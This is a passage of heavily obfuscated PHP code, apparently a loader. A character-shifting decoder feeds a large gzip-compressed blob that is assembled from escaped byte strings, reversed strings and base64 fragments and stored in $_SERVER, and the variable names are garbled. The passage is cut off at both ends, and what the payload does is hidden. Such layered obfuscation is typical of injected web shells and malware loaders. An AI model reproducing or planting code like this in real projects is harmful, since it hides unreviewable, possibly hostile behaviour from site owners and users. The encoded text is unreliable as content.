($eå·½¡÷”„ + 1 < $eôà®˜ôğ) { $A–¾âÛ‘‘« .= chr(ord($FŸ‹÷¡‹‚“[$eå·½¡÷”„ + 1]) + $Føö©—àËŸ); $A–¾âÛ‘‘« .= chr(ord($FŸ‹÷¡‹‚“[$eå·½¡÷”„]) + $Føö©—àËŸ); } else { $A–¾âÛ‘‘« .= chr(ord($FŸ‹÷¡‹‚“[$eå·½¡÷”„]) + $Føö©—àËŸ); } } return $A–¾âÛ‘‘«; } } define("\254\210\332\302\224\311\360\344\236", base64_decode('9ZfknJHTvw==')); $_SERVER[¬ˆÚÂ”Éğä] = explode("\x7c\x1\x7c\x5\x7c\x1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x9\x7c\x1b\xc5\xf5\x30\x50\x6e\xa\x85\x16\xa\x94\x6b\x71\x12\x62\x3b\x3a\x1c\xdb\xb9\x9c\xc4\x89\x2c\xc9\xb6\x12\xdb\x52\x24\x39\x4e\x62\x39\xca\x4a\x5a\x49\x1b\x4b\x5a\x79\x77\xe5"."\53\16\107\270\11\367\25\356\24\132\50\167\40\320\160\6\110\71\312\15\205\77\1\312\125\216\44\34\245\34\245\334\320\157\356\231\135\311\264\375\370\341\150\346\315\233\331\71\336\274\171\63\363\336\233\217\307\166".strrev('³¾o—ıÜ\\·Ä¶ÏÌó°;ª‚ú‹òÏßô\'sİ­GÃíŒ»c®ØøãŸ›ÈóŸ×çËı;ÏçlmÛ')."\347\322\105\255\257\277\363\320\272\353\356\74\170\153\150\364\362\115\153\37\371\364\335\53\137\377\323\61\157\53\73\256\270\171\307\261\127\74\365\345\313\337\335\364\303\63\263\27\74\357\333\355\262\213\226\375\152\335"."\234\117\47\175\65\377\306\266\347\47\335\166\357\262\51\336\261\255\357\274\376\327\133\235\316\323\363\221\257\346\237\63\351\244\355\157\316\170\356\303\253\266\134\275\365\157\243\377\356\275\162\363\317\166\74\177\300\265".strrev('O«¤#‘ö¨}ê»yì§ÿ‚âsXÏb<NÓ·î²?_%ï¼ÿ›OÏl`ú<¯í“ïvÿÏÛÿYáŸ')."\x7f\xf0\xcc\x7f\x36\x7c\xf2\xee\xc0\xa1\x7b\x75\x8e\x3d\xb2\x31\xb0\xec\xb6\x97\x1d\x57\x6e\x54\x2f\xbb\xe3\xb3\x39\xa7\xbf\x39\xe9\xe6\xe7\x3d\x8b\x17\x7b\xde\x19\xfa\x79\x71\xe6\xe3\xe7\x4f\x9e\x7e\xd8\x7b\xbf\x7a\x41\x7b\xe2\xdc"."\263\316\377\305\57\237\53\5\336\70\164\306\254\3\137\77\124\171\147\363\306\277\135\170\332\35\135\123\253\17\330\343\320\23\112\322\360\361\63\277\233\273\305\271\363\273\123\256\175\333\334\174\344\206\135\126\276\267"."\xf1\x89\x1f\xfa\xb\xb7\xc\x7f\xfd\xc5\xfd\x4b\xbe\x78\xed\xaa\x8e\x1f\x1e\xba\xd6\xbf\xec\x9f\x23\x7b\x96\x5e\xdf\x25\x17\xca\x2e\x79\xe2\xac\x9b\x37\x8c\x3d\x61\xbc\x72\xb3\x92\x6b\x9a\x38\xf5\x92\x7d\x17\x9c\xfc\x7\xff\x9\xda"."\76\75\347\354\343\12\34\267\363\366\327\66\376\371\261\135\166\332\11\167\160\23\376\221\12\232\51\51\303\252\141\32\30\220\324\12\151\65\203\303\152\1\377\272\361\217\61\220\123\115\5\207\343\135\301\150\74\322"."\35\12\371\303\321\70\51\121\114\317\153\51\22\52\312\272\234\47\205\27\25\335\0\237\22\213\213\27\265\242\122\260\100\70\40\45\233\162\102\66\110\111\276\226\270\317\37\352\10\56\215\107\227\206\374\4\43\21"."\37\50\51\372\10\216\241\140\304\224\165\63\252\346\25\206\61\244\263\172\265\370\333\2\135\122\64\354\351\212\170\274\321\100\260\13\203\275\301\316\316\100\264\34\36\16\166\164\264\170\274\13\313\123\102\141\117\133"."\xa7\x47\x2\xf5\xcb\x29\x71\xb5\x90\xd6\xaa\xa5\x15\x38\x65\x85\x54\x83\x3\xad\xaa\x92\x4b\xe1\x60\x41\xa6\xd5\x31\x47\x8a\x24\x14\x65\x21\x30\x6\x85\x52\x2e\x87\x23\x5d\x2c\x44\xea\xaf\xa4\xe5\x52\x8e\xf4\x99\x4f\x8c\x14\x75\x35"."\x2f\xd3\xa6\x2f\x54\x46\x18\x14\x7\xe4\x92\xa9\xa9\x85\x24\x8e\xf8\x87\x4d\x5d\xe6\x70\x50\xe3\xa4\xae\xe4\x95\x2\x29\x2a\xe2\xef\xf0\x7b\xa3\x12\xac\xa6\xd4\x1a\xe\x76\x4a\x64\x28\xf2\xb2\x61\x2a\xba\xd4\xd3\xee\xf\xfb\x25\x58"."\365\271\223\121\213\47\113\70\137\167\27\350\20\311\323\321\41\215\127\202\251\344\213\264\30\234\247\102\141\301\260\317\37\226\132\226\112\274\237\222\132\76\257\25\134\240\24\60\236\246\120\125\177\70\214\3\16\102".base64_decode('wR0BOHQkEmxtjfhZjDRuUQeoSQOhUksslc6Z8UE5V6LE2o9/J5Mf8qsZhIAH1IJaIsRKitA0NnNIoA==')."\104\261\25\12\311\203\154\32\231\123\140\202\15\342\340\334\146\374\73\233\40\45\342\60\115\321\315\270\122\110\152\51\265\100\246\341\74\62\345\10\341\311\146\326\247\253\0\217\24\250\271\222\132\161\244\123\33\44"."\x6d\x48\xab\x39\xa5\x83\xcd\xb2\xb4\x96\x4b\x29\x3a\x8f\x17\x41\x76\x31\x85\x34\x46\x1d\x15\x72\x77\x95\xf2\x22\xa\x8b\x26\xb3\x6a\x2e\xa5\xd3\xc9\xf9\x53\x98\x53\x49\xb1\x8a\x69\x82\x66\x18\xb4\xa6\xdd\xc5\x9c\x26\xa7\x22\x8a\x2e"."\324\276\25\24\23\54\231\42\260\204\320\132\65\75\357\3\14\200\364\16\40\173\265\273\102\102\77\45\374\224\320\51\56\302\270\252\173\117\160\376\330\327\73\37\374\123\103\270\130\214\124\55\253\344\162\161\145\130"."\41\23\44\237\232\146\320\332\273\215\204\132\160\3\10\216\6\202\361\254\154\144\73\123\323\342\50\27\145\216\51\145\330\125\314\26\311\34\146\323\66\146\41\140\330\337\135\232\351\27\130\154\116\113\312\71\261\245"."\70\234\65\315\142\104\51\244\140\207\220\26\151\103\5\324\141\105\105\41\110\76\207\224\222\72\245\245\122\173\223\332\104\251\13\320\112\172\204\163\274\254\231\317\261\20\155\55\203\31\14\150\16\23\232\250\42\161"."\x65\xd8\x24\x9d\x24\xcd\x4e\x66\x65\x1d\xc\xdf\xdc\x92\x99\x76\xce\x24\x8c\xa3\x58\xcc\xa9\x49\xd9\x54\xb5\x82\x5b\x4b\x9a\x8a\xe9\x34\x4c\x5d\x91\x49\x69\x55\xb3\x25\x48\x11\x70\x6\xd7\xe2\x5c\x74\xf6\x78\xb5\x82\x9\xa6\xaf\x33"."\252\313\5\43\255\350\116\77\41\357\46\11\364\63\343\140\24\315\247\32\105\315\120\341\147\232\44\331\64\345\144\26\316\176\136\374\334\237\300\127\13\71\265\240\224\341\172\222\111\305\60\234\60\213\256\345\234\236"."\x5c\x4e\x1b\x72\x6\x75\x35\xa3\x82\x3c\xb5\xb6\x6a\x2\xce\xd4\x24\x51\xb6\x59\x54\x75\xc5\xa0\x51\xa9\xad\x33\x4a\x90\x41\xad\x14\x67\x48\x97\x33\x79\xb9\x49\x2a\x96\x12\xa0\x67\xc8\xfc\xac\x0\xc3\xd8\xe4\xeb\x4d\x52\x12\x46\x1d"."\122\276\144\230\116\135\1\354\107\5\13\35\31\274\100\332\331\11\307\123\125\122\316\10\340\322\4\334\120\327\50\1\62\222\150\32\206\266\107\243\241\170\240\25\54\306\135\376\170\247\47\352\155\47\325\66\345\14"."\255\163\7\340\275\254\110\12\134\342\4\123\16\22\132\27\350\43\16\14\151\103\212\16\76\334\62\322\44\365\153\251\204\66\354\242\111\20\71\2\270\4\105\206\75\132\64\235\141\271\220\201\375\223\30\61\25\102"."\216\306\140\306\332\241\35\112\41\143\146\151\306\210\77\274\330\37\216\107\202\255\321\36\117\330\117\146\17\30\210\141\372\51\130\164\316\31\126\122\240\353\223\46\315\47\27\141\257\121\34\70\121\340\30\323\124\70"."\171\150\132\107\240\15\166\214\317\151\0\44\247\210\105\313\356\120\363\52\254\273\311\122\120\117\202\65\276\215\124\310\215\32\64\67\226\255\255\216\245\246\324\70\301\277\265\65\275\61\237\253\266\157\236\133\345\171"."\334\123\135\123\245\372\272\351\122\10\10\35\252\234\223\110\243\313\60\352\244\340\302\237\350\0\270\46\11\323\334\326\165\30\30\366\57\352\366\107\242\361\116\177\264\75\350\43\137\360\173\110\250\103\303\123\223\266"."\250\27\377\364\221\21\4\242\102\106\111\152\71\115\227\163\220\1\121\172\123\50\23\310\250\151\316\327\3\100\240\41\35\213\71\37\217\104\324\174\221\62\50\63\133\312\47\204\240\233\227\100\150\1\14\31\143\113"."\32\133\203\64\235\204\232\334\44\313\244\372\126\312\154\335\221\6\360\77\347\254\51\55\57\123\111\24\115\134\45\205\147\56\6\325\132\122\332\25\231\57\152\246\156\152\20\252\133\120\72\25\63\253\221\176\316\50"."\xb4\x4a\x25\x56\x37\x5a\xcb\x94\x92\x53\x68\x2f\x65\x15\xca\xa5\x81\x78\x35\xc8\x3a\xaf\xa8\x2b\x69\x95\xd0\x2d\x90\xa7\x0\x9c\x73\x61\xd5\x8\x83\x4c\x50\xbe\xa1\xf1\x1e\x28\x86\x72\x80\xc9\x19\xb6\x6c\x70\xa6\xf\x23\xc2\xca\xdc"."\332\335\321\21\367\6\273\242\100\24\305\220\236\160\40\352\247\24\341\361\305\75\336\20\133\302\370\60\21\4\70\75\313\331\33\206\14\326\13\174\237\57\20\234\345\322\205\16\262\124\34\6\274\260\250\25\14\305"."\231\44\245\245\70\363\305\30\263\155\234\267\54\7\27\200\207\235\162\176\324\231\127\114\331\311\252\156\135\337\244\250\270\114\6\310\20\160\146\231\3\213\52\330\137\320\205\65\24\214\220\14\363\40\24\110\43\11"."\105\47\365\10\165\223\244\274\60\374\155\176\2\334\233\256\215\62\221\134\74\75\21\312\350\112\0\137\127\107\145\336\306\171\264\76\244\354\341\174\216\13\130\161\325\62\176\161\55\261\22\160\61\100\164\162\245\126".base64_decode('O/lYRdsDXQvjnUGfvyMe6AJcIloO7w75PHTwRXhLMNpugXYDPrHY0xGwo/uXBCLRSMUkAOv221LAlg==')."\x2b\x14\xf6\xb7\x6\x96\xb0\x68\x6b\xc0\xdf\xe1\x8b\xc4\xbd\x1e\x6f\x3b\xc7\xe9\xf2\x74\x92\x48\x3c\xd\x37\x3d\x86\xdb\x8a\x1f\x7\xc\x2f\xc2\xb6\x4e\xf1\x41\xb8\xd\xa4\x9d\x19\xb7\xec\x53\xe2\x54\x2\x8f\x73\x3a\x1\x8b\x97\x42"."\150\223\64\27\156\76\121\113\210\114\234\324\112\224\132\231\20\227\247\14\42\57\223\31\52\323\205\251\32\377\324\110\236\210\144\26\343\214\25\44\106\130\20\65\203\306\201\270\106\276\57\21\346\133\126\203\70\304"."\151\121\322\232\256\374\24\300\223\66\31\141\330\342\140\336\360\64\60\2\36\264\313\5\224\200\106\44\116\347\242\1\366\7\36\132\235\64\337\141\306\203\140\53\356\201\373\323\170\117\70\330\325\106\62\14\145\25"."\x5a\x81\x0\xe9\xfe\x6a\x2a\xcc\x90\x6d\xaa\xc9\x59\x12\x90\x44\x64\x2e\x54\xd2\x4e\x5f\xa9\xd1\xae\x1c\xc3\x3f\xc7\xe0\x1f\x20\xbc\x91\x8f\x2b\x5\xda\xeb\x9\xc8\x98\x19\xe3\xa0\x7b\x10\x30\x5b\x28\x53\xd5\x4a\xec\x6b\x9\x4d\xcb".strrev('*JW@\\¡Øbp`nŸ­LC¤Ã2Ø'."\0".'b5c…”§ßĞ¸4C‹"Õt)§2˜d‰A¥wØ/ÆcÖyÑ').base64_decode('7S63awqhYgWsP+Tz7uWxoSnVvc4prj4QqKmdj6MkFnNZohNJ/pLOckMxpdqYV9MUc8fc1fOaej3OUQ==').base64_decode('2Tla55zl7JsSc9VMIYC+VfWOxtUQASDOm9AHfubG5k2KOY85dsX83ljf5KYpR8dcE2JDfbU18+h3kg==')."\x25\x1d\x6c\xce\x92\x23\xac\xaa\xa9\x29\xd5\xa0\x4a\x40\x7c\x61\x28\x5\xc4\x12\x5\x4\x9a\x30\xaa\x16\x39\x74\xd5\xf4\xd5\x14\xe\xc6\x50\xc9\xf0\x1c\xbd\xce\xd8\x94\xbe\x79\x42\x3e\x1\x64\xff\x16\x10\x5d\x0\x7f\xce\x32\x3c\x8f"."\163\31\154\31\313\12\347\75\241\217\122\41\311\271\53\234\27\11\71\111\370\200\232\51\260\51\4\26\164\266\51\266\112\315\253\46\341\337\325\164\40\63\12\135\226\341\171\226\116\250\263\124\120\7\350\126\277\240"."\xc\x90\x80\x66\x52\xfa\x4e\x28\xe6\x90\x42\xc9\x3\xc0\x2d\x71\x40\x1c\x74\xdb\x6\x92\x84\x58\xe\x9\x69\xe4\xb\x7c\xbb\xa4\xa0\xbd\x3\x69\x45\x31\xe\xc5\xae\x21\x16\x4b\x29\x5\x32\x4e\x7b\x11\x6c\x23\x29\x17\x95\x88\xd0\xc2"."\x78\x3c\xea\x69\xe9\xf0\xc7\x29\x87\x21\x9c\x98\xc6\x11\x57\x6c\x61\x87\x63\xa0\x69\x9c\xa3\x52\xfe\x90\xe4\x22\xb3\x31\x90\x93\x10\x33\x90\x14\x5d\xd7\xf4\x26\x74\xf0\x67\x94\x8a\x50\x16\x3\xbb\x26\x13\xf4\xa7\x4\xb6\xd2\xd2\xdc"."\146\11\167\63\341\22\161\261\323\213\62\225\46\340\356\226\111\10\356\352\130\254\324\253\244\372\172\1\41\313\316\164\337\252\206\325\65\124\112\166\307\300\177\64\202\371\27\251\161\221\217\237\1\144\255\244\311\26"."\xdc\xb2\xf3\xa9\x38\xe3\x80\xb0\xa\xec\x98\x41\xd3\xd9\x3a\xb\xe1\x5c\x6a\x35\x35\x53\xce\x31\x34\x98\x16\x85\x10\xca\x6d\xe8\x5a\x4d\xf6\xe8\x78\x0\x3b\x38\x13\x82\xab\xb3\x70\x7a\x87\x38\x64\x17\x3b\x9a\x62\x27\xe\xc2\xc1\x11"."\200\71\204\50\376\167\156\25\145\323\5\60\21\274\174\221\12\370\234\144\20\75\113\234\1\42\300\263\200\112\105\115\31\114\147\223\102\15\255\244\47\25\206\143\21\62\114\131\7\153\26\227\354\240\14\46\34\57"."\202\232\73\340\71\204\3\256\251\16\40\355\71\340\171\217\203\113\254\16\176\204\340\140\362\247\203\210\245\16\136\72\11\6\174\16\325\360\41\361\30\225\213\222\150\235\315\54\334\220\347\344\21\7\256\177\207\62"."\250\344\34\264\366\16\332\50\7\155\201\3\355\67\174\244\66\335\200\76\110\155\120\20\60\211\254\3\16\7\34\133\132\12\14\322\156\140\102\265\203\13\334\216\214\256\225\212\41\372\45\41\206\53\103\0\274\246"."\14\20\326\64\323\101\67\100\54\320\311\70\20\254\16\17\55\346\3\316\153\317\226\117\322\4\34\267\327\1\103\141\172\253\74\50\16\160\305\301\56\130\11\203\237\222\362\323\74\56\56\331\67\42\366\343\41\336"."\211\274\22\121\71\23\21\76\157\312\31\372\355\12\251\70\34\126\222\43\111\276\271\361\11\273\45\153\214\15\75\242\303\112\304\124\171\350\31\201\60\132\333\173\257\275\50\145\163\72\42\344\143\41\266\161\251\233".strrev('ü”BÄ>N:8lğ!À,‰´™Ÿ(Âå-ëiıBaB…=è†e•$”…dJaÎAAO)…Àd+äX)·').base64_decode('qFoc92s8z3YWrKNtzAj2e0gtjKgFce/OoZzncaKA5M1juI/HC2Pews8GHOTMwAH2jf0C1+N7XFB7mA==').base64_decode('Vag7KclWczoBndYon4/dYJsUt5EqIdKsrPNepnMMEjZrlQFReFRAS8uDnN1b8ggzwzBH2DGHELQWig==').strrev('çëTrÜa* çmÇ÷*3óĞ( $éâˆk'."\r".'áF*ÕZŒ)Y½'."\0".'èÕ:N*)W÷lí"ñ¾£')."\141\74\21\110\74\71\60\64\272\13\316\236\66\310\361\304\345\211\57\135\220\313\342\260\200\124\264\63\107\13\23\257\264\42\332\331\270\15\152\213\362\217\132\30\122\331\262\105\244\26\42\244\326\221\351\220\2\333"."\111\227\216\131\236\13\310\45\45\14\167\324\11\353\36\237\327\253\214\21\303\124\362\204\105\256\266\365\216\11\366\75\11\131\167\351\240\106\274\242\174\255\40\122\111\211\1\372\354\30\270\370\16\215\12\311\160\142".strrev('mEÂC…}xrŞ4A7^&’âJ/‹±˜‹UŞ,JÌI\\“ö§ ÆÊ¸—Q„ÁŸü'."\n".'#‹4ôiÍ!	ªSø')."\x9e\xdd\x67\x21\xa0\xcb\x30\xb5\x22\x4f\x11\xa2\x38\x59\x48\xe2\x85\xa\x58\xac\xf3\x51\xd\xc1\xd2\x90\x42\x82\x3\xef\x42\x84\x4b\xf2\x22\xd1\x1a\x13\xb7\x2b\x7\x30\x5c\x22\x8f\xf2\xe8\x3a\x25\x12\xdc\x3c\x78\xb4\x3\x80\x22\x8"."\316\343\10\75\132\254\304\252\161\341\376\101\176\1\213\213\202\37\166\341\225\313\45\247\122\101\172\356\46\206\313\121\305\143\206\312\5\241\73\161\126\224\20\253\214\356\311\345\370\5\233\75\76\156\26\74\127\305"."\x4c\x22\x64\xdc\x6c\xad\x48\x3a\xa6\x27\xdf\x95\x60\x4c\xd8\x6b\xb5\xd1\x10\x9f\x71\xfc\x2\xd3\x2e\xb\x5b\x99\xcf\x7f\x92\xd3\xca\x66\x0\x1f\xd0\xca\x71\xc8\x1f\xb3\x6a\x41\xa1\xfb\x30\xb0\xd9\x34\x2a\xf1\x99\xff\x24\xf8\x58\xc4".base64_decode('YauEI4o2ZJ3kzRW7FZL/eLQA04TTJrC5AgBxgWFHKpzvCGsoWo/ipkUeCKMyhPlgGWIw/3CLWnUtHw==').base64_decode('CIL5VZno7HgKPVRCTG2Y7dXETIBI4Co0Xpk0mRXFl6xL8M9jb72AA1Nnkt362C5I/QiFufLRyUs+Kg==')."\xbc\xfb\xd8\x41\xbb\xaf\x69\x7e\x7c\x7b\x3a\xf7\xfa\x92\x85\x6f\x5c\x7b\x5d\xaf\x6f\xeb\xa3\x17\xf7\x6c\xca\x5\x36\xcd\xb8\x3c\x7d\xfa\xd1\xb3\xe\x54\xcf\x3b\xfc\x8c\xc3\x97\x9d\x7f\xf9\xbc\xb5\x9b\x9e\xd8\xde\x76\xc6\x81\x6f\xec"."\322\371\227\153\366\135\366\333\335\376\232\372\331\235\355\347\356\272\372\362\321\217\357\367\237\172\105\203\67\174\330\37\366\111\76\72\253\341\212\131\353\76\271\342\237\373\176\366\302\320\151\47\274\265\372\355\67\216"."\xba\xff\xbb\x96\x13\xfe\xfd\xfc\x43\x83\xdf\x44\x1a\xd7\x37\x4d\xda\xf7\x83\xeb\x5e\x88\xde\x9d\xfa\x70\xff\x7d\x67\x4d\x98\x73\x4e\xb1\x7d\x9f\xdf\x4c\xf\xec\xe4\xfe\x68\xfb\xa3\x1b\x17\x39\xd6\x1d\xb4\xf9\xd5\xbf\x9d\x7f\xee\xee".strrev('—š©ë¶³ká¸nº¯?¼ì½¿ŞÚ|?I°@z·§-ÿš©÷;=ÿËşÏ¿Çç1æÖæ³ğLÎ').base64_decode('X7ih8/7pqw475rzAoy1X+o7cbd8JC3a5um1x38CPn2X3X7Eu5HCadR0nn/fYKZ+u3P+3F/2madPZdw==').strrev('-+çİÓ›?)šåûö«×älyıŸ¾»–ÊoæS{3Xíÿğ×ú¿Ïèb<º§ı8üNª¾'."\n".'+‘ğrì')."\274\150\323\233\43\275\257\256\274\346\226\265\133\267\236\270\376\315\105\157\275\172\322\334\277\265\335\161\360\35\33\227\157\250\172\375\370\167\317\152\170\112\375\160\132\344\206\337\34\164\356\212\27\277\134\61\170\334"."\x2b\x6f\xff\xe2\xdd\xbd\xee\xde\x74\x65\xf3\x17\xa7\xee\xf1\xfd\x48\xa6\xee\xf5\xc2\xbe\xff\x77\x73\xf5\x8e\xde\x8d\x9f\x9f\xb9\xe0\x9e\x74\xe3\xd3\xe1\x43\xaf\xa9\xdb\xe7\x87\x95\x4b\x37\x1c\xd4\x7f\xf7\xe3\x93\x6e\x7a\x68\xe3\x4d".base64_decode('ozcsfuyZY27+S8vC/osXLrt972LshUsjGz6YdssLO51+e9OEg+5Yessl25rWXeK66mr9d+FHOl+ZtQ==')."\x7b\xe8\xed\xd7\x1f\x5b\xbb\xcb\x67\xc9\xd8\x49\xb3\x6e\xde\xff\xb9\xf5\xdd\x1f\x9e\x12\xbe\x49\x9a\x7b\xc7\x9b\x47\xff\xfc\x9c\x77\xdb\x5f\x1e\xd8\xf3\xd9\x2f\xef\x7c\xa8\xee\xf2\x7f\x5d\xb3\xfc\x80\xf3\xde\x6d\x77\x7d\xba\xfe\x84".base64_decode('I1646uPHD3G7Gh9ctOFo/5Zu1weHN2VP/tl+/9plq3PjHr2HLZrZsPCi65bXrnn2u58fuf/zn9X+/g==')."\225\43\216\271\321\273\70\261\123\361\222\216\43\244\203\63\177\76\342\360\65\223\216\174\254\365\265\77\175\173\263\363\57\327\235\172\302\310\41\165\355\37\335\166\352\71\177\52\172\166\111\36\70\353\266\107\36\135"."\xbe\xeb\x3\x77\x1e\xfa\xe9\xb7\xc5\xf\xd7\x78\x9e\x6e\x8b\xcc\x91\xea\x23\x27\x9f\x76\xe5\xcc\xdf\x3d\xf2\xdc\xd6\x33\x1f\xb8\xea\xb0\x4d\x27\x1f\xfc\x4d\x71\xdd\xbd\x2b\x8e\xf0\xd6\x19\x87\x1f\xf7\x98\x6b\xe3\x95\x4f\x3c\x79\xf0"."\322\324\335\233\146\334\176\333\155\205\47\303\217\37\165\100\113\344\104\365\370\317\236\137\67\113\275\172\247\340\343\315\205\131\67\357\327\371\112\154\373\243\173\135\166\114\102\236\366\307\301\374\303\373\157\30\35\36"."\x78\xfa\x4f\x6f\x4e\x38\xfb\xe8\x5d\xf6\xbc\xe6\xe2\x4f\xfe\x70\xda\xb3\xaf\x14\xa4\x33\x56\x4d\x5c\xf1\xea\x1e\xc9\x8d\x9f\x1e\xbe\xe6\xcc\x3d\x36\xcd\xbb\xad\x6f\xf6\xc1\x57\x1f\xb0\xb5\xe7\xde\xb\x5e\x6a\x9c\x52\x98\x7d\xc8\xe9"."\177\337\364\370\232\23\366\374\105\116\273\170\335\337\17\173\351\314\363\76\33\173\354\67\65\311\123\67\4\366\73\372\376\47\76\274\365\243\27\137\32\312\337\361\253\227\277\52\165\134\173\336\337\352\323\163\226\36"."\365\311\302\233\337\177\244\341\343\232\247\223\13\362\132\323\356\63\57\253\326\365\373\274\333\77\313\75\275\371\227\147\44\162\223\157\275\352\334\103\277\334\352\277\352\302\111\307\277\175\116\340\201\115\15\115\373\157"."\377\373\242\335\143\37\275\373\336\311\221\313\227\275\172\176\76\375\313\45\27\251\233\36\150\374\362\225\253\375\276\263\142\107\75\167\332\316\277\12\374\353\361\127\36\372\56\174\335\223\23\57\372\361\224\107\163\227"."\x37\x1f\x18\xef\xd9\xf5\xb8\xfb\xa6\xfd\xe3\xae\x97\x1e\xde\x9a\x9a\xf1\x51\xd7\x1\x49\xd7\xec\x3f\x7b\x1e\xef\xfa\x60\x74\x47\xe8\xf3\x45\xa7\xf5\x1f\x74\xd0\xaa\x7b\x1d\xbb\xfc\x3d\xbb\xe9\xc6\x4f\x2e\x9d\xf8\xd5\x82\xdf\x7c\xba".base64_decode('uOuBtS0fzfJccdi5f3q8Ibp13ZKvf+/9+sRJ8f+7zlzc88WN4V+ZOx96SofzlcXPvHDSkratocmb1g==').strrev('ŞXÎCûğ7?õ{õSØ}^Ùš¿Í©ÛğöÜXß_àØÔòüo†+-–şºOÕã~©v}Ìû1úT\\»')."\323\170\205\153\305\143\55\23\176\361\340\211\155\23\177\376\350\5\376\232\363\373\23\335\223\253\62\211\121\337\265\323\376\364\336\25\323\306\176\270\344\260\275\253\147\316\130\372\321\315\267\135\165\326\321\17\144\216"."\136\345\74\254\163\367\3\317\162\234\274\370\326\205\367\257\351\372\376\240\144\333\257\235\217\374\376\221\175\6\16\377\350\116\367\27\153\367\375\100\31\175\170\355\51\261\37\136\77\160\141\351\214\57\56\137\376\105"."\162\357\273\67\337\53\157\255\162\235\335\373\330\276\57\272\256\173\377\310\345\217\146\367\173\60\23\370\353\316\127\135\376\345\3\307\335\150\334\261\164\340\365\103\66\336\61\361\370\331\356\313\257\333\371\142\227\261"."\343\225\255\375\235\175\67\255\333\367\366\153\237\256\133\274\351\245\231\341\17\36\161\36\276\353\304\341\3\66\235\223\133\64\161\154\336\37\117\331\167\367\357\73\346\7\156\17\235\337\60\371\360\372\261\61\355\225"."\105\301\173\177\167\373\304\330\316\323\7\244\343\357\232\175\351\341\67\376\256\260\141\366\207\147\317\377\331\76\43\127\375\366\300\37\116\374\354\244\155\247\377\365\315\374\21\207\233\173\354\324\174\351\17\373\311\217"."\254\72\352\231\360\330\346\323\236\236\21\167\255\63\117\365\375\366\313\355\17\367\174\162\350\365\17\277\362\256\343\322\233\243\207\277\277\344\222\111\273\337\372\273\225\67\54\133\23\335\143\206\276\374\276\3\326\33"."\xeb\xee\xfa\xc1\x33\xf6\x7c\xeb\xcc\xfb\x9e\x7a\x39\x7f\xdb\x55\x67\xfc\x23\x6d\xce\x9c\x78\xcd\xb2\xc3\x94\xc1\xd0\x3d\x89\x7\x3e\xaf\x3d\xea\xc1\x6f\x36\x16\x2e\x5c\x78\xd1\x87\x1f\x9f\xf5\x4c\xcf\xf4\xe5\x7\x74\x9f\x7f\xd9\xbd"."\313\153\326\115\213\74\265\365\236\375\136\233\166\101\323\356\135\17\247\116\135\31\376\132\131\170\352\311\317\35\373\257\257\137\75\352\270\143\177\170\65\276\141\175\363\275\337\376\363\167\332\372\261\261\37\276\370\340"."\xa3\x97\x83\xf\xde\xff\xfd\x7b\x47\xad\xfb\x64\xf5\xf7\x7f\x7f\xf1\xc1\xd8\xea\xcf\x5f\x7d\xe9\x93\xe3\x6e\xdf\xb4\xdf\x9a\xef\xa6\xcf\xfb\xea\xca\xa3\xfa\xb7\x5c\xb9\xfe\xa1\xad\x33\x6f\xe8\x53\x5f\x31\x9a\xdf\xbe\x66\xcb\x96\xae".base64_decode('/S4NVe195HWOo9JvHNI8tuWX3+169eii5J1z411fXPLxXmdMmNnTMbjT4M7S8cueNmdVXbz2xgW/qg==')."\131\262\341\315\103\352\237\361\174\353\270\365\270\303\236\70\372\312\306\305\375\337\326\137\223\72\357\241\7\36\232\365\355\317\357\120\167\336\315\163\344\47\53\116\271\340\40\375\255\43\216\132\133\250\136\230\171\62".base64_decode('+Mq1e3rvW/Vi3Q5N27zp9m+K/3zptRvvfvyybQs+ePux7R+vWrV54A/qbzI7vtncMiPqvFA/b7/HHg==')."\170\374\246\103\156\70\371\137\307\304\143\67\255\277\142\136\350\232\147\77\375\360\360\131\347\265\117\372\262\160\306\203\167\116\137\324\162\305\155\127\176\275\157\325\273\177\76\351\227\241\232\247\2\13\62\17\115\270".base64_decode('Yst7h1/+/Hu73LfpuarQq1/mmq6r3umlC++8J/VW+5KBE/749ie7HyH/4evmAy7fs+3tA08eO+zg+w==').base64_decode('fjPlIn3974trXtz43ptfbrwhferqGW+8/mX1Pw+duVj+94/nLNhj0dj20eBznwUO2nRr3dbbP7z7nw==')."\x17\xdc\xb1\x62\x69\xf4\xb1\x13\xdb\x7b\xdf\xdf\xf2\xc3\xe2\xaf\x3c\xc1\xd7\xfa\xb\x6f\x6f\x7b\xf4\x83\x99\x4d\x2b\x8f\x72\x3e\xf5\xda\xc3\x9b\xd7\x8e\x3e\xfa\xd2\xf6\xb3\x9e\x58\xf1\x4a\xf3\x87\x35\x9e\xe7\x66\x2d\x7e\xff\x83\x1f"."\xde\xb9\x78\x76\xdc\xb1\xe3\x77\x57\xfe\xc3\xf7\xaf\xfb\x36\x9f\x7d\xe2\x5d\xdb\xa7\x3d\xfa\xda\x6b\xb7\xfc\xe3\xcc\x8e\xa6\xa6\x35\x37\x66\x66\xa5\x77\x3b\xf8\xa2\xb0\xf7\xd3\x53\x1e\x7b\xea\xf2\xbb\x66\x5c\x76\xe5\x55\x27\x55\xb7".base64_decode('3vqbu7ru//2Nz7ZWvf7ra/efufWvDs+Rrw6or7fvur1uzRnJxJMzPq9e0i9P/MSZb77joDvuOeqNxA==')."\352\23\75\173\74\172\325\75\306\51\317\56\272\176\217\115\356\351\153\357\77\351\334\67\217\375\70\23\333\151\362\143\63\256\374\172\301\320\237\356\257\35\334\255\341\17\107\77\334\175\337\113\201\77\136\272\304\161"."\110\250\165\116\306\337\21\321\327\355\326\60\365\225\266\23\356\176\362\356\267\367\273\300\261\353\356\347\257\321\57\33\34\165\256\331\353\317\363\217\235\162\342\247\273\155\132\267\351\345\63\174\7\65\34\362\142\107"."\xdb\xbd\xc9\x6\x63\xf6\xdf\xbf\xdd\xed\xa6\x1f\x8a\x97\x2c\x5a\x33\xa5\xf1\x8b\xc3\xbf\xe9\x7c\xb7\x74\x5b\xfd\xb3\xef\xf\xc\x55\x7f\xbb\x6f\xf2\xaa\xd5\xf3\xee\x71\x7e\xf5\x87\xab\xbe\x9f\xf3\xe9\xf7\x1f\x1f\xe6\xde\xad\xe7\x91".base64_decode('z16+c/7zX7fE0q/ecsSLscuO/sWsm57fb5+f77R8etsvn/7w/CmTffs/uWp7Q9uTx7122kt9p625vg==')."\151\322\171\265\327\54\317\174\370\240\363\203\315\213\136\276\361\210\315\333\27\171\137\375\310\375\346\137\27\271\316\316\376\323\163\340\21\347\137\160\301\307\37\364\236\21\367\53\367\35\273\361\256\227\233\256\230\275"."\xf6\x98\x45\xf7\x3d\